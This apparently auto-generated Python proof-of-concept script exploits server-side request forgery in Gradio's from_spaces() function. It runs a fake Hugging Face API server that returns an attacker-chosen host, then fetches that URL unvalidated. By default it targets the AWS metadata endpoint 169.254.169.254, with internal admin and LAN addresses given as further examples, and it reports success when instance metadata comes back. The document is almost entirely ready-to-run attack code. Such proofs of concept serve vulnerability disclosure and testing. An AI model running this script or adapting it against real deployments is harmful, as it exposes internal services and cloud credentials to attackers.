#!/usr/bin/env python3
# PoC for gradio_src (/tmp/gradio_src)
# Path: ssrf-000
# Sink: from_spaces_interface
# Auto-generated — run with: python3 ssrf_hugging_face_api_get_from_spaces_interface.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via Gradio from_spaces() function

Vulnerability: The from_spaces() function in gradio/external.py takes a user-controlled
space_name parameter, fetches a host URL from the Hugging Face API, and then makes an
unvalidated request to that URL. An attacker can create a malicious Space that returns
a crafted iframe_url pointing to internal services (e.g., cloud metadata endpoints).

This PoC demonstrates the SSRF by:
1. Setting up a simple HTTP server that mimics the Hugging Face API response
2. Returning a malicious iframe_url pointing to an internal IP
3. Showing that the code will follow redirects and fetch the internal resource

Usage:
    python3 poc_gradio_ssrf.py [--target TARGET_URL] [--listen-port PORT]

    --target: The internal URL to target (default: http://169.254.169.254/latest/meta-data/)
    --listen-port: Port for the malicious API server (default: 8888)

Requirements: Python 3.6+, requests (standard library)
"""

import argparse
import json
import re
import sys
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse

# Try to import requests - it's a common dependency but let's be safe
try:
    import requests
except ImportError:
    print("Error: This PoC requires the 'requests' library.")
    print("Install it with: pip install requests")
    sys.exit(1)


class MaliciousAPIHandler(BaseHTTPRequestHandler):
    """
    HTTP handler that mimics the Hugging Face API response for /api/spaces/{space_name}/host
    Returns a malicious iframe_url pointing to an internal target.
    """
    
    def do_GET(self):
        # Check if this is a request to our fake API endpoint
        if "/api/spaces/" in self.path and self.path.endswith("/host"):
            # Parse the target URL from the server configuration
            target_url = self.server.target_url
            
            # Return a response that mimics the Hugging Face API
            response = {
                "host": target_url,
                "status": "running"
            }
            
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(json.dumps(response).encode())
            print(f"[*] Malicious API response sent: iframe_url = {target_url}")
        else:
            # For any other request, return 404
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")
    
    def log_message(self, format, *args):
        # Suppress default logging to keep output clean
        pass


def start_malicious_server(target_url, port=8888):
    """
    Start a simple HTTP server that mimics the Hugging Face API
    and returns a malicious iframe_url.
    """
    server = HTTPServer(("0.0.0.0", port), MaliciousAPIHandler)
    server.target_url = target_url
    print(f"[*] Starting malicious API server on port {port}")
    print(f"[*] Will return iframe_url pointing to: {target_url}")
    
    # Start server in a separate thread
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    
    return server


def simulate_exploit(malicious_space_name, target_url, api_port=8888):
    """
    Simulate the vulnerable from_spaces() function with a malicious space_name.
    This demonstrates how an attacker can control the iframe_url.
    """
    print(f"\n[*] Simulating exploit with space_name: {malicious_space_name}")
    print(f"[*] Target internal URL: {target_url}")
    
    # Step 1: Construct the API URL (this is what the vulnerable code does)
    api_url = f"http://localhost:{api_port}/api/spaces/{malicious_space_name}/host"
    print(f"[*] Step 1: Fetching host from: {api_url}")
    
    try:
        # Step 2: Make the API request (simulating the vulnerable code)
        response = requests.get(api_url, timeout=5)
        iframe_url = response.json().get("host")
        
        if not iframe_url:
            print("[!] No host returned from API")
            return
        
        print(f"[*] Step 2: Received iframe_url: {iframe_url}")
        
        # Step 3: The vulnerable code then makes a request to iframe_url WITHOUT validation
        print(f"[*] Step 3: Making unvalidated request to iframe_url...")
        print(f"[*] This is where the SSRF occurs!")
        
        # Make the request (this is what the vulnerable code does)
        r = requests.get(iframe_url, timeout=5, allow_redirects=True)
        
        print(f"[*] Response status: {r.status_code}")
        print(f"[*] Response headers: {dict(r.headers)}")
        print(f"[*] Response body (first 500 chars): {r.text[:500]}")
        
        # Check if we got internal data (cloud metadata, etc.)
        if "meta-data" in r.text or "instance-id" in r.text or "ami-id" in r.text:
            print("\n[!] SUCCESS: Retrieved cloud metadata! SSRF confirmed!")
        elif r.status_code == 200:
            print("\n[+] SSRF successful - received response from internal target")
        else:
            print(f"\n[?] Response received (status {r.status_code})")
            
    except requests.exceptions.ConnectionError as e:
        print(f"[!] Connection error: {e}")
        print("[!] Make sure the malicious server is running")
    except requests.exceptions.Timeout:
        print("[!] Request timed out")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")


def main():
    parser = argparse.ArgumentParser(
        description="PoC: SSRF via Gradio from_spaces() function",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Test with cloud metadata endpoint (AWS)
  python3 poc_gradio_ssrf.py --target http://169.254.169.254/latest/meta-data/
  
  # Test with local service
  python3 poc_gradio_ssrf.py --target http://127.0.0.1:8080/admin
  
  # Test with custom port
  python3 poc_gradio_ssrf.py --target http://192.168.1.1 --listen-port 9999
        """
    )
    
    parser.add_argument(
        "--target",
        default="http://169.254.169.254/latest/meta-data/",
        help="Internal URL to target (default: AWS metadata endpoint)"
    )
    parser.add_argument(
        "--listen-port",
        type=int,
        default=8888,
        help="Port for malicious API server (default: 8888)"
    )
    
    args = parser.parse_args()
    
    # Validate target URL
    parsed = urlparse(args.target)
    if not parsed.scheme or not parsed.netloc:
        print(f"[!] Invalid target URL: {args.target}")
        print("[!] URL must include scheme and host (e.g., http://127.0.0.1:8080)")
        sys.exit(1)
    
    print("=" * 60)
    print("Gradio SSRF Proof-of-Concept")
    print("=" * 60)
    print(f"\n[*] Target internal URL: {args.target}")
    print(f"[*] API server port: {args.listen_port}")
    
    # Start the malicious API server
    server = start_malicious_server(args.target, args.listen_port)
    
    # Give the server a moment to start
    time.sleep(0.5)
    
    # Simulate the exploit
    # The space_name can be anything - the attacker controls the API response
    malicious_space_name = "attacker-controlled-space"
    simulate_exploit(malicious_space_name, args.target, args.listen_port)
    
    # Cleanup
    print("\n[*] Shutting down malicious server...")
    server.shutdown()
    
    print("\n[*] PoC complete.")
    print("[*] This demonstrates how an attacker can achieve SSRF by:")
    print("  1. Creating a malicious Hugging Face Space")
    print("  2. Having the Space's API return a crafted iframe_url")
    print("  3. The vulnerable code fetches the iframe_url without validation")
    print("  4. requests.get() follows redirects by default, enabling SSRF")


if __name__ == "__main__":
    main()
